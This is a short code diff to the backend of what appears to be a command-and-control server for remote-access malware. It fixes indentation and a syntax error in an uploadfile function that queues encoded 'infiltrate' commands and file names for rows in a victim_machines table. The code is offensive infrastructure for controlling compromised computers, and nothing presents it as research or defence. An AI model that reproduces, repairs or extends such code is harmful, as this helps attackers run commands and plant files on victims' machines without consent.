@@ -54,11 +54,11 @@ def uploadfile( id, file_path, file_name ):
 			encoded_updated = encode(json_string)
 
                         #update command_record SEPARATELY
-                        decoded_command_record = decode(result[0][2])
-                        json_data = json.loads(decoded_command_record)
-                        json_data["infiltrate"].update(new_command)
-                        json_string_record = str(json.dumps(json_data)
-                        encoded_record = encode(json_string_record)
+			decoded_command_record = decode(result[0][2])
+			json_data = json.loads(decoded_command_record)
+			json_data["infiltrate"].update(new_command)
+			json_string_record = str(json.dumps(json_data))
+			encoded_record = encode(json_string_record)
 
 			#add the epoch and custom file name to the table for future use
 			decoded_filenames = decode(result[0][1])
@@ -72,10 +72,10 @@ def uploadfile( id, file_path, file_name ):
 			filename_updated = encode(json_file)
 
 			#update the database if the row already exists
-                        update_query = """ UPDATE victim_machines SET command=%s WHERE victim_id=%s """
-                        update_data = (encoded_updated, id)
-                        update_command_record = """ UPDATE victim_machines SET command_record=%s WHERE victim_id=%s """
-                        update_command_data = (encoded_record, id)
+			update_query = """ UPDATE victim_machines SET command=%s WHERE victim_id=%s """
+			update_data = (encoded_updated, id)
+			update_command_record = """ UPDATE victim_machines SET command_record=%s WHERE victim_id=%s """
+			update_command_data = (encoded_record, id)
 			command_record_query = """ UPDATE victim_machines SET file_names=%s WHERE victim_id=%s """
 			update_file_data = (filename_updated, id)
 
